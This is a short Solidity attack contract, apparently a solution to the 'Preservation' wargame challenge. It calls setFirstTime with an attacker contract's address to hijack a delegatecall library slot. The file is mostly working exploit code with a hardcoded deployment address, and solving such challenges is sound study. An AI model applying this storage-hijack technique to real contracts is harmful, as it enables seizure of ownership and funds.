// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "./preservation.sol";


contract AttackPreservation {
    Preservation public target;

    constructor(address targetAddress) {
        target = Preservation(targetAddress);
    }

    function attack(address exploit) public {
        target.setFirstTime(uint256(uint160(exploit)));
    }

}

// 0xD65E10D69d5D170ec4A94FC303Fc171A1e85d9Ab